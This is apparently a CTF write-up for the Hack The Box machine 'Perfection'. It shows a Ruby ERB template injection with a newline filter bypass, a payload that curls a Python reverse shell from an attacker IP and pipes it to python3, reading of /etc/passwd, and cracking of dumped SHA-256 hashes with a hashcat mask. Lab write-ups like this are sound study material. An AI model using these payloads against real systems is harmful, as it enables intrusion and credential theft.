---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Perfection

## Enumeration

### Nmap

```
┌──(razz㉿kali)-[~]
└─$ sudo nmap -sV -sC 10.129.232.10 
[sudo] password for razz: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 17:55 CET

Nmap scan report for 10.129.232.10

Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
```

## Web (HTTP 80)

It is a website with school grade calculator. You fill the input as instructed with names, grades, and percentual grade weight. It will then render the result on the page.

By quickly looking around, I can see that is `Powered by WEBrick 1.7.0`, based on the footer. That is a ruby gem <https://rubygems.org/gems/webrick/versions/1.7.0>

So it is Ruby

### Server Side Template Injection

Ruby loves templates, and it is often the way in, if the input is not sanitised and rendered directly. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby)

Let's capture the POST request using Burpsuite, so I can meddle with it.

```
POST /weighted-grade-calc HTTP/1.1

Host: perfection.htb

Content-Length: 231

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://perfection.htb

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://perfection.htb/weighted-grade-calc

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

category1=a&grade1=1&weight1=20&category2=b&grade2=2&weight2=20&category3=c&grade3=3&weight3=20&category4=d&grade4=1&weight4=20&category5=e&grade5=2&weight5=20
```

#### Crafting the payload

Now since I noticed that the `category` is rendered back, I try to put my payload there.

```
<%= File.open('/etc/passwd').read %>
```

I need to URL-encode it **in full** (that is usually important).

```
%3C%25%3D%20File%2Eopen%28%27%2Fetc%2Fpasswd%27%29%2Eread%20%25%3E
```

Place it under `category1` and send.

And it did not work. The page replies `Malicious input detected`. Bummer. But don't be afraid. Let's try to obfuscate it. The first thing you can do is add newline. The code will execute, but if `=~` (regex) is used for comparison, it might get through due to being multi-line.

```
<%= File.open('/etc/passwd').read %>
Pwnd
```

Again, URL-encode it in full and send. Bang! That works! Now for the reverse shell

##### Reverse shell

```
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('curl 10.10.14.121:80/tcp_pty_backconnect.py | python3') %><%= @b.readline()%>
Pwnd
```

I use the nice python shell. So to set it up

```
# Prepare http server with shell

python3 -m http.server 80
# Run listener

python2 tcp_pty_shell_handler.py -b 0.0.0.0:443
```

Send the payload (URL-encoder, as usual). And that's our user. Hello `susan`.

## Escalate to Root

By looking around, I can spot a SQLite file chilling there in home. Open it.

```
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db

sqlite> .tables

users

sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57

3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393

4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a

5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

That could be `SHA-256`. But hashcat cannot crack it.. there must be some other way

Lets run `linpeas.sh`. It tells me that susan can run `sudo` (for which I need the password). But also one more thing...

### The Mail

The mail. Again. Susan got mail. Linpeas tells me that there is something in (/var/mail/susan).

```
susan@perfection:~$ cat /var/mail/susan

Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

Great, so now i know how the password will look like. Back to hashcat.

### Hascat

This is the most frustrating part. Crafting the right hashcat command. I know that I need to use the mask attack, but the docs (<https://hashcat.net/wiki/doku.php?id=mask_attack>) are not that helpful. I guess that's why the box is graded lower than 4.

Anyway, through some trial and error. I got the right stuff.

```
hashcat -m 1400 -a 3 --increment hash susan_nasus_?d?d?d?d?d?d?d?d?d?d
```

which after a while gives me the password. Now I can `sudo` to directly to the flag. Nice!